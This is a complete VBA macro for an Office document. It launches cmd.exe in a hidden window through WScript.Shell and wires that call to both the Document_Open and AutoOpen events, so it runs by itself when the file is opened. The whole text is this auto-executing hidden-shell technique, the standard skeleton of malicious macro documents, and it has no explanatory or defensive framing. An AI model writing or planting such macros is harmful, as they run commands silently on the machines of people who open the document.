Sub createObjectShell()
	Dim str As String
	str = "cmd.exe"
	CreateObject("Wscript.Shell").Run str, 0
End Sub

Sub Document_Open()
	createObjectShell
End Sub

Sub AutoOpen()
	createObjectShell
End Sub
